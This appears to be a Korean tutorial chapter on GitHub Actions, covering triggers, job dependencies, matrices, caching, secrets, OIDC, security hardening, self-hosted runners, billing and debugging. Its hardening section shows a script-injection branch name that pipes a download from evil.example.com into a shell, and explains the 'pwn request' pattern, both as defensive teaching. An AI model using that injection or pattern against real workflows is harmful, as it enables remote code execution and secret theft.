GitHub Actions 깊이 알기

PART 2에서는 "이슈가 열리면 GitHub 클라우드의 실제 Windows 서버(VM)에서 엑셀을 변환한다"는 워크플로우 하나를 만들었습니다. 이 장에서는 그 YAML 한 줄 한 줄 뒤에서 무슨 일이 일어나는지, 실무에서 CI/CD를 설계·운영할 때 알아야 할 문법·보안·비용·디버깅을 전문가 수준으로 정리합니다.

(참고) 실습에 꼭 필요하지는 않지만… PART 3은 선택 학습 자료입니다. 실습을 마치는 데는 필요 없지만, 직접 워크플로우를 설계하거나 팀의 CI를 맡게 되면 여기 나오는 내용 대부분을 마주치게 됩니다. 필요한 절만 골라 읽어도 됩니다. 숫자(요금·한도·runner 사양)는 작성 시점(2026년 11월) 기준이며 자주 바뀌니, 각 절의 공식 문서 링크로 최신 값을 확인하세요.

1. 아키텍처: 이벤트에서 Step까지

GitHub Actions는 "저장소에서 일어난 이벤트를 받아, 워크플로우 파일을 해석하고, Job마다 runner를 배정해, 그 안에서 Step을 순서대로 실행하는" 시스템입니다.

Runner의 일생 (GitHub-hosted)

  1. Job 대기열 등록 — 이벤트가 오면 워크플로우가 해석되고, 각 Job이 runs-on label에 맞는 runner를 기다립니다.
  2. 새 VM 할당 — 표준 GitHub-hosted runner는 Job마다 깨끗한 새 VM(클라우드의 실제 서버 한 대)을 받습니다. 이전 Job의 파일·설치 도구·캐시 디렉터리는 하나도 남아 있지 않아요. (예외: 1 vCPU ubuntu-slim은 공유 VM 위 컨테이너)
  3. Step 실행 — 같은 Job 안의 Step은 같은 작업 디렉터리($GITHUB_WORKSPACE)를 공유합니다. Linux·macOS는 비밀번호 없는 sudo, Windows는 관리자 권한(UAC 꺼짐)입니다.
  4. 정리·폐기 — Job이 끝나면 VM은 폐기되고, Job 전용 GITHUB_TOKEN도 만료됩니다. 남기고 싶은 결과는 artifact·cache·커밋으로 밖에 내보내야 합니다.
PART 2와 연결 Excel 변환 워크플로우가 매번 pip install부터 다시 하는 이유가 바로 "Job마다 새 VM"이기 때문입니다. setup-python의 cache: pip는 다운로드한 패키지를 GitHub 캐시 저장소에 보관했다가 새 VM에 다시 풀어 주는 장치예요.

2. 트리거(on:) 완전 정복

필터와 activity types

on:
  push:
    branches: [main, "release/**"]     # glob 지원
    tags: ["v*.*.*"]
    paths:                              # 이 경로가 바뀐 경우에만
      - "src/**"
      - "!src/**/*.md"                  # ! 로 제외 (순서 중요: 뒤에 오는 패턴이 이김)
  pull_request:
    types: [opened, synchronize, reopened, ready_for_review]
    branches: [main]                    # PR의 "대상(base)" 브랜치 기준
  issues:
    types: [opened, labeled]
  • branches와 branches-ignore, paths와 paths-ignore는 각각 같은 이벤트에서 함께 쓸 수 없습니다(부정 패턴 !을 쓰세요).
  • types를 생략하면 이벤트마다 정해진 기본 type만 반응합니다. 예: pull_request는 opened, synchronize, reopened.
  • paths 필터로 건너뛴 워크플로우는 "실행되지 않음"이라 필수 상태 검사(required check)가 영원히 대기할 수 있습니다. 필수 검사로 지정할 Job이라면 Job 단위 if로 건너뛰는 방식을 고려하세요.

수동 실행: workflow_dispatch

on:
  workflow_dispatch:
    inputs:
      target:
        description: "배포 대상"
        type: choice
        options: [staging, production]
        default: staging
      dry_run:
        type: boolean
        default: true
      env_name:
        type: environment              # 저장소의 environment 목록에서 선택

입력 타입은 string·boolean·choice·number·environment 다섯 가지이고, 최상위 입력은 최대 25개입니다. 값은 ${{ inputs.target }}으로 읽습니다. CLI에서는 gh workflow run deploy.yml -f target=production -f dry_run=false.

예약 실행: schedule

on:
  schedule:
    - cron: "0 0 * * 1-5"              # timezone 이 없으면 UTC 기준 → 한국 시간 09:00
    - cron: "30 8 * * 1"
      timezone: "Asia/Seoul"            # IANA 타임존 지정 (최근 추가된 옵션)
  • cron은 기본적으로 UTC입니다. 한국(KST=UTC+9) 기준으로 쓰다 하루가 밀리는 실수가 흔해요. 최근 문서에는 timezone 키가 추가되었으니 사용 가능 여부를 공식 문서에서 확인하세요.
  • 최소 간격은 5분이며, 기본 브랜치의 최신 커밋에서만 실행됩니다.
  • 정각(0 * * * *)은 전 세계 사용자가 몰려 수 분~수십 분 지연되거나 드물게 누락될 수 있습니다. 정확한 시각이 중요하면 17 * * * *처럼 어긋난 분을 쓰세요.
  • 공개 저장소에서 오랫동안(60일) 활동이 없으면 예약 워크플로우가 자동 비활성화될 수 있습니다.

3. Job 설계: 의존성·조건·병렬

needs, if, outputs

jobs:
  detect:
    runs-on: ubuntu-latest
    outputs:
      changed: ${{ steps.diff.outputs.changed }}     # step output → job output
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 2 }
      - id: diff
        run: |
          if git diff --quiet HEAD~1 -- data/; then
            echo "changed=false" >> "$GITHUB_OUTPUT"
          else
            echo "changed=true" >> "$GITHUB_OUTPUT"
          fi

  convert:
    needs: detect                                     # detect 성공 후에만
    if: needs.detect.outputs.changed == 'true'        # 출력은 항상 "문자열"
    runs-on: ubuntu-latest
    steps:
      - run: echo "변환 시작"

  notify:
    needs: [detect, convert]
    if: ${{ !cancelled() }}                           # 앞 Job이 실패/건너뜀이어도 실행
    runs-on: ubuntu-latest
    steps:
      - run: echo "convert 결과 = ${{ needs.convert.result }}"
  • needs가 없으면 Job은 모두 병렬로 시작합니다.
  • needs된 Job이 실패·건너뜀이면 뒤 Job은 기본적으로 건너뜁니다. 그래도 실행하려면 상태 함수(always(), failure(), !cancelled())를 if에 넣어야 합니다. 사용자가 취소해도 돌아가는 always()보다 !cancelled()가 대체로 안전합니다.
  • Job output은 문자열입니다. 'true'처럼 따옴표로 비교하세요. 큰 데이터는 output이 아니라 artifact로 넘깁니다.

strategy.matrix

jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false          # 하나가 실패해도 나머지 계속 (기본값 true)
      max-parallel: 4           # 동시에 최대 4개
      matrix:
        os: [ubuntu-latest, windows-latest]
        python: ["3.11", "3.12", "3.13"]
        exclude:
          - os: windows-latest
            python: "3.11"      # 이 조합은 빼기
        include:
          - os: ubuntu-latest
            python: "3.13"
            coverage: true      # 기존 조합에 변수 추가
          - os: macos-latest
            python: "3.12"      # 새 조합 추가
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: "${{ matrix.python }}" }
      - if: matrix.coverage
        run: echo "커버리지 측정"

matrix는 한 워크플로우 실행당 최대 256개 Job까지 만들 수 있습니다. fromJSON()으로 앞 Job이 계산한 목록을 matrix로 넘기는 동적 matrix도 가능합니다.

jobs:
  list:
    runs-on: ubuntu-latest
    outputs:
      files: ${{ steps.ls.outputs.files }}
    steps:
      - uses: actions/checkout@v4
      - id: ls
        run: echo "files=$(ls data/*.xlsx | jq -R . | jq -cs .)" >> "$GITHUB_OUTPUT"
  convert:
    needs: list
    runs-on: ubuntu-latest
    strategy:
      matrix:
        file: ${{ fromJSON(needs.list.outputs.files) }}
    steps:
      - run: echo "변환: ${{ matrix.file }}"

concurrency: 겹치는 실행 제어

# PR마다 최신 커밋만 검사 (이전 실행은 취소)
concurrency:
  group: ci-${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: true
설정동작어울리는 곳
cancel-in-progress: true새 실행이 오면 진행 중인 실행 취소PR 테스트 (최신 커밋만 의미 있음)
cancel-in-progress: false (기본)진행 중 실행은 끝까지. 대기는 1개만, 더 오면 이전 대기분이 취소됨배포 (중간에 끊기면 안 됨)
queue: max (최근 추가)최대 100개까지 순서대로 대기. cancel-in-progress: true와 함께 쓸 수 없음모든 요청을 빠짐없이 처리해야 할 때
PART 2 워크플로우의 숨은 함정 Excel 변환과 화면 배포는 같은 group: dashboard-data를 씁니다. 기본 동작에서는 대기 슬롯이 1개라, 이슈 3개가 연달아 올라오면 가운데 이슈의 실행은 취소될 수 있어요. 모든 업로드를 처리해야 한다면 queue: max를 고려하세요.

5. 데이터 나르기: Cache · Artifact · Environment

Cache vs Artifact

CacheArtifact
목적다음 실행을 빠르게 (의존성, 빌드 캐시)결과물을 보관·전달 (빌드 산출물, 리포트, Job 간 파일)

보안PR에서 만든 캐시는 기본 브랜치에서 안 읽힘 (캐시 오염 방지)누구나(읽기 권한자) 다운로드 가능 → 비밀 넣지 말 것
 
steps:
  # 1) setup-* 내장 캐시: 가장 간단
  - uses: actions/setup-python@v5
    with:
      python-version: "3.12"
      cache: pip
      cache-dependency-path: scripts/requirements.txt

  # 2) 직접 캐시: 원하는 경로·키
  - uses: actions/cache@v4
    with:
      path: ~/.cache/my-tool
      key: tool-${{ runner.os }}-${{ hashFiles('**/lockfile') }}
      restore-keys: |
        tool-${{ runner.os }}-

  # 3) 산출물 업로드 (짧게 보관)
  - uses: actions/upload-artifact@v4
    with:
      name: data-json
      path: build/data.json
      retention-days: 3
      if-no-files-found: error
캐시 키 설계 key는 정확히 일치해야 hit, 아니면 restore-keys의 접두사로 가장 최근 캐시를 부분 복원합니다. lockfile 해시를 키에 넣는 것이 정석입니다. 캐시는 덮어쓰지 않으므로(같은 키는 불변) 내용이 바뀌면 키가 바뀌어야 해요.

Environments: 승인과 보호 규칙

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://dashboard.example.com
    steps:
      - run: ./deploy.sh
        env:
          API_KEY: ${{ secrets.PROD_API_KEY }}   # production 환경에만 있는 secret
  • Required reviewers(최대 6명/팀): 지정된 사람이 승인해야 Job이 시작됩니다.
  • Wait timer(최대 30일), Deployment branches/tags(예: main과 v* 태그만 배포 가능), GitHub App 기반 custom rule.
  • 환경 secret은 보호 규칙을 통과한 Job에만 전달됩니다. "PR 브랜치에서 prod 키를 쓸 수 없게" 만드는 가장 확실한 방법이에요.
  • 플랜 제약(작성 시점): Free·Pro·Team에서는 required reviewers·wait timer가 public 저장소에서만 동작합니다. 공식 문서 확인.

Secrets와 Variables

  • Secret 값은 로그에서 ***로 가려지지만 완벽하지 않습니다. base64 인코딩, 한 글자씩 출력, JSON 일부 등 변형된 값은 가려지지 않아요. 비밀 값을 가공했다면 ::add-mask::로 등록하세요.
  • Secret은 if: 조건에서 직접 쓸 수 없습니다. env로 옮긴 뒤 env.X != ''로 확인하는 패턴을 씁니다.
  • fork에서 온 PR(pull_request)에는 secret이 전달되지 않습니다(GITHUB_TOKEN은 읽기 전용으로만). PART 2 AI 리뷰가 같은 저장소 PR만 대상으로 한 이유입니다.
# CLI로 secret/variable 설정 (값은 프롬프트 또는 파일/표준입력으로)
gh secret set ANTHROPIC_API_KEY            # 대화형 입력, 셸 히스토리에 남지 않음
gh secret set PROD_API_KEY --env production < key.txt
gh variable set DASHBOARD_TITLE --body "매출 대시보드"

GITHUB_TOKEN과 permissions:

GITHUB_TOKEN은 Job마다 발급되는 GitHub App 설치 토큰으로, 해당 저장소에만 유효하고 Job이 끝나면 만료됩니다(GitHub-hosted에서는 Job 최대 시간인 6시간이 사실상 상한). 기본 권한은 저장소·조직 설정(Settings → Actions → General → Workflow permissions)에 따르며, 2023년 이후 생성된 저장소·조직은 대체로 읽기 전용(restricted)이 기본입니다.

permissions: {}                 # 워크플로우 기본: 아무 권한 없음

jobs:
  test:
    permissions:
      contents: read            # Job별로 필요한 것만
    runs-on: ubuntu-latest
    steps: [...]
  release:
    permissions:
      contents: write           # 태그/릴리스 생성
      id-token: write           # OIDC 토큰 요청
    runs-on: ubuntu-latest
    steps: [...]

하나라도 지정하면 지정하지 않은 권한은 모두 none이 됩니다. 주요 스코프: contents, issues, pull-requests, actions, checks, statuses, deployments, pages, packages, id-token, security-events, attestations.

OIDC: 클라우드에 장기 키 없이 로그인

AWS 액세스 키를 secret에 넣어 두면 유출 시 만료될 때까지 계속 쓰일 수 있습니다. OIDC를 쓰면 Job이 GitHub에 서명된 짧은 수명의 ID 토큰을 요청하고, 클라우드는 토큰의 sub 클레임(예: repo:you/excel-dashboard:environment:production)을 확인해 임시 자격 증명을 내줍니다.

permissions:
  id-token: write      # OIDC 토큰 발급
  contents: read

jobs:
  upload:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-dashboard-deploy
          aws-region: ap-northeast-2
      - run: aws s3 sync ./site s3://example-dashboard-bucket --delete
클라우드 쪽 신뢰 조건을 좁게 IAM 역할의 신뢰 정책에서 sub를 repo:you/*처럼 넓게 열면, 같은 계정의 아무 저장소·아무 브랜치(fork PR 포함 가능)가 역할을 가져갈 수 있습니다. 저장소 + environment(또는 브랜치)까지 고정하세요. Azure(azure/login), GCP(google-github-actions/auth)도 같은 원리입니다.

Reusable workflow 만들기·호출하기

# .github/workflows/convert-reusable.yml (호출되는 쪽)
on:
  workflow_call:
    inputs:
      engine:
        type: string
        default: openpyxl
    secrets:
      NOTIFY_TOKEN:
        required: false
    outputs:
      rows:
        value: ${{ jobs.convert.outputs.rows }}

jobs:
  convert:
    runs-on: ubuntu-latest
    outputs:
      rows: ${{ steps.run.outputs.rows }}
    steps:
      - uses: actions/checkout@v4
      - id: run
        env:
          ENGINE: ${{ inputs.engine }}
        run: echo "rows=42" >> "$GITHUB_OUTPUT"
# 호출하는 쪽
jobs:
  call:
    uses: you/shared-workflows/.github/workflows/convert-reusable.yml@v1
    with:
      engine: openpyxl

작성 시점 기준으로 최대 10단계 중첩, 한 실행에서 고유 재사용 워크플로우 50개까지 호출할 수 있습니다(한도 문서).

간단한 Composite action 만들기

# .github/actions/setup-converter/action.yml
name: Setup converter
description: Python + 의존성 설치를 한 번에
inputs:
  python-version:
    description: 사용할 Python 버전
    default: "3.12"
  requirements:
    description: requirements 파일 경로 (호출 저장소 기준)
    default: scripts/requirements.txt
outputs:
  python-path:
    description: 설치된 python 경로
    value: ${{ steps.py.outputs.python-path }}
runs:
  using: composite
  steps:
    - id: py
      uses: actions/setup-python@v5
      with:
        python-version: ${{ inputs.python-version }}
        cache: pip
    - shell: bash                     # composite의 run step은 shell 필수
      env:
        REQ: ${{ inputs.requirements }}   # 입력도 env로 넘기는 습관
      run: pip install -r "$REQ"
# 사용하는 쪽 (같은 저장소라면 checkout 후 로컬 경로로)
steps:
  - uses: actions/checkout@v4
  - uses: ./.github/actions/setup-converter
    with:
      python-version: "3.13"

다른 저장소에 공개하려면 저장소 루트에 action.yml을 두고 태그(v1)를 붙이면 uses: you/setup-converter@v1로 쓸 수 있습니다. Marketplace 게시는 선택입니다.

8. 보안 강화(Hardening)

워크플로우는 저장소 쓰기 권한과 secret을 가진 원격 실행 환경입니다. 공격자 입장에서는 매력적인 표적이에요.

① 스크립트 인젝션

${{ }}는 셸 실행 전에 문자열로 치환되므로, 이슈 제목·PR 제목·브랜치 이름·커밋 메시지 같은 사용자가 정할 수 있는 값을 run:에 직접 넣으면 명령 주입이 됩니다.

# ❌ 브랜치 이름이 a";curl${IFS}evil.example.com|sh;# 라면?
- run: echo "Branch: ${{ github.head_ref }}"

# ✅ 환경 변수로 넘기면 셸은 "값"으로만 취급
- env:
    HEAD_REF: ${{ github.head_ref }}
  run: echo "Branch: $HEAD_REF"

위험한 필드 예: github.event.issue.title/body, github.event.pull_request.title/body/head.ref, github.event.comment.body, github.event.commits.*.message, github.head_ref. actions/github-script의 script: 안에서도 같은 문제가 생깁니다(JavaScript 인젝션).

② pull_request vs pull_request_target

pull_requestpull_request_target
실행되는 코드PR의 merge 커밋 (PR 작성자의 코드)base 브랜치의 워크플로우 정의
fork PR의 권한읽기 전용 토큰, secret 없음쓰기 토큰 + secret 있음
용도빌드·테스트 (기본 선택)라벨 달기·댓글 등 PR 코드를 실행하지 않는 작업
"pwn request" 패턴 pull_request_target(또는 workflow_run)에서 actions/checkout으로 PR head 코드를 받아 빌드·테스트·스크립트 실행을 하면, 공격자가 PR에 넣은 코드가 secret과 쓰기 토큰을 가진 채 실행됩니다. 실제 오픈소스 공급망 사고의 단골 원인입니다. 꼭 필요하면 PR 코드 실행 Job(권한 없음)과 결과를 게시하는 Job(권한 있음, 코드 실행 없음)을 분리하고, artifact 내용도 신뢰하지 마세요.

③ 서드파티 Action 고정

# 태그는 저장소 주인이 언제든 다른 커밋으로 옮길 수 있음
- uses: actions/checkout@v4
# ✅ 전체 커밋 SHA로 고정 + 사람이 읽을 수 있게 주석으로 버전 표기
- uses: actions/checkout@<40자리-커밋-SHA> # v4.x.x

이 사이트의 예제는 읽기 쉽게 버전 태그를 썼지만, 실무에서는 특히 서드파티 Action을 SHA로 고정하는 것이 권장됩니다. 실제로 인기 Action의 태그가 악성 커밋으로 바뀌어 secret이 로그로 새어 나간 사고가 있었습니다. 조직·저장소 설정에서 "SHA 고정 필수"와 허용 Action 목록을 강제할 수도 있어요.

SHA 고정 후 업데이트는 Dependabot이 맡게 합니다.

# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
    groups:
      actions:
        patterns: ["*"]

④ 보안 체크리스트

  • 워크플로우 최상단 permissions:를 최소로, Job별로 필요한 쓰기 권한만 추가
  • 신뢰할 수 없는 입력은 env:로 전달, run:·script:에 ${{ }}로 직접 넣지 않기
  • pull_request_target·workflow_run에서 PR 코드 실행 금지
  • 서드파티 Action은 SHA 고정 + Dependabot, 허용 목록 정책
  • actions/checkout에 persist-credentials: false (이후 step이 git push할 필요가 없다면)
  • 장기 클라우드 키 대신 OIDC, 배포 secret은 environment에
  • 공개 저장소에서 누가 워크플로우를 깨울 수 있는지(author_association, fork PR 승인 설정) 확인
  • CODEOWNERS로 .github/workflows/ 변경에 리뷰 필수
  • 정적 분석 도구(zizmor, actionlint)와 CodeQL의 Actions 분석으로 워크플로우 점검

fork PR의 테스트 결과에 댓글을 달려고 pull_request_target으로 바꾸고, PR 코드를 checkout해서 npm test를 실행했습니다. 가장 큰 문제는?

정답! npm test는 PR이 수정할 수 있는 package.json의 스크립트를 실행합니다. pull_request로 테스트하고, 결과는 artifact로 남긴 뒤 별도 Job(코드 실행 없음)에서 댓글을 다는 구조가 안전합니다.

9. Self-hosted runner

언제 쓰나

  • 특수 소프트웨어·라이선스가 필요할 때 (PART 2의 Excel이 설치된 Windows가 대표 예)
  • 사내망 자원(DB, 사설 레지스트리)에 접근해야 할 때
  • GPU·대용량 메모리 등 hosted runner로는 비싸거나 없는 하드웨어
  • 대량 실행 시 비용 최적화 (단, 운영 인력 비용을 함께 계산)

위험과 대응

공개 저장소 + self-hosted runner = 위험 공개 저장소에서는 누구나 PR을 열 수 있고, 그 PR의 코드가 여러분의 머신에서 실행될 수 있습니다. 비영구(persistent) runner라면 악성 코드가 다음 Job을 기다리며 상주하거나, 내부망으로 이동할 수 있어요. 공개 저장소에는 self-hosted runner를 붙이지 않는 것이 기본 원칙입니다.
대응설명
Ephemeral runner./config.sh --ephemeral: Job 하나만 실행하고 등록 해제. VM/컨테이너를 매번 새로 만들어 hosted runner처럼 "깨끗한 상태" 보장
Runner group조직 수준에서 어떤 저장소·워크플로우가 이 runner를 쓸 수 있는지 제한
네트워크 격리runner가 접근할 수 있는 내부 자원을 최소화, 아웃바운드 제한
Actions Runner Controller (ARC)Kubernetes에서 runner scale set을 자동 확장·축소. 대기 Job 수에 맞춰 ephemeral 파드 생성
최소 권한 계정runner 서비스를 관리자 계정으로 돌리지 않기, 머신 자격 증명 공유 금지
 
# self-hosted runner 선택: label을 모두 만족하는 runner에 배정
jobs:
  excel:
    runs-on: [self-hosted, windows, excel]

label 이름은 단지 이름일 뿐 물리 위치나 권한을 보장하지 않습니다. 어떤 runner가 어느 저장소에 등록되어 있는지 정기적으로 점검하세요.

10. 요금과 한도

요금 체계는 자주 바뀝니다. 아래는 작성 시점 기준이며, 반드시 요금 문서와 한도 문서를 확인하세요.

과금 기본

  • Public 저장소의 표준 GitHub-hosted runner는 무료입니다. (larger runner는 public에서도 과금)
  • Private 저장소는 플랜에 포함된 월 사용량을 쓰고, 넘으면 분 단위로 과금됩니다. 현재 공식 문서는 포함량을 "분"이 아니라 금액으로 표시합니다(예: Free $12, Pro·Team $18, Enterprise Cloud $300 상당).
  • Self-hosted runner 사용 시간은 현재 문서상 무료입니다(하드웨어·운영 비용은 본인 부담).

11. 디버깅

로그 상세도 올리기

  • Re-run jobs → "Enable debug logging" 체크: 그 재실행에만 디버그 로그 활성화.
  • 항상 켜려면 저장소 secret 또는 variable로 ACTIONS_STEP_DEBUG=true(step 상세), ACTIONS_RUNNER_DEBUG=true(runner 진단 로그)를 설정.
  • context 전체 덤프: env: { CTX: "${{ toJSON(github.event) }}" } 후 echo "$CTX". 공개 로그에 민감한 값이 없는지 확인하세요.

gh CLI로 터미널에서

gh run list --workflow excel-to-dashboard.yml --limit 5
gh run watch                          # 진행 중인 실행 실시간 보기
gh run view <run-id> --log-failed     # 실패한 step 로그만
gh run rerun <run-id> --failed --debug  # 실패 Job만 디버그 모드로 재실행
gh run download <run-id> -n data-json # artifact 받기
gh cache list                         # 캐시 목록 (gh cache delete 로 정리)

로컬에서 미리 돌려 보기: act

nektos/act는 Docker 컨테이너로 워크플로우를 흉내 내 실행합니다. YAML 문법·간단한 스크립트 검증에는 유용하지만, Windows·macOS runner, OIDC, GitHub 캐시·일부 context는 재현되지 않습니다. PART 2의 windows-latest Job은 act로 확인하기 어려워요.

act -l                                # 실행될 Job 목록
act issues -e event.json -j convert   # 가짜 이벤트 payload로 특정 Job 실행
actionlint                            # 워크플로우 정적 검사 (문법·표현식·셸)

자주 만나는 증상

증상원인과 해결
Job이 계속 "Queued"동시 실행 한도 초과, runs-on label에 맞는 runner 없음(오타·self-hosted 오프라인), concurrency 그룹 대기
Resource not accessible by integration (403)permissions:에 필요한 스코프 누락, fork PR의 읽기 전용 토큰
워크플로우가 아예 안 뜸YAML 오류(Actions 탭 경고 확인), 이벤트가 기본 브랜치에 없는 워크플로우 정의를 참조(issues·schedule 등은 기본 브랜치 기준), paths 필터, GITHUB_TOKEN이 만든 이벤트
Windows에서만 실패기본 셸이 pwsh($VAR 대신 $env:VAR), CRLF, 경로 구분자
output이 비어 있음step에 id 없음, Job outputs:에 매핑 누락, secret으로 판단되어 마스킹된 값은 Job 간 전달 안 됨

12. 성능 최적화

기법효과PART 2 적용 예
Linux 우선준비 시간·단가 모두 유리엑셀 앱이 필요 없다면 ubuntu-latest + openpyxl
Matrix 병렬파일·버전별 Job을 동시에지역별 엑셀 여러 개를 동시 변환 후 한 Job에서 합쳐 배포
캐시의존성 설치 시간 단축cache: pip + cache-dependency-path
Path 필터관계없는 변경에 실행 안 함deploy-dashboard.yml의 paths: ["dashboard/**"]
얕은 checkout기본 fetch-depth: 1 유지, 전체 이력은 필요할 때만docs 브랜치 작업에만 추가 fetch
concurrency 취소쓸모없어진 PR 실행 즉시 중단PR 테스트 워크플로우에 cancel-in-progress: true
Job 분할·조기 실패빠른 lint를 먼저, 무거운 Job은 needs로 뒤에lint 실패 시 Windows Job 자체를 띄우지 않음
사전 빌드 이미지매번 설치하는 도구를 컨테이너 이미지에 포함container: ghcr.io/you/converter:1.0 (Linux)

private 저장소에서 엑셀 10개를 변환합니다. 비용과 시간을 모두 줄이는 가장 좋은 첫 수는?

정답! Linux는 단가가 가장 낮고 준비가 빠르며, matrix로 10개를 동시에 처리하면 전체 시간이 가장 긴 파일 하나 수준으로 줄어듭니다. macOS는 단가가 약 10배입니다.
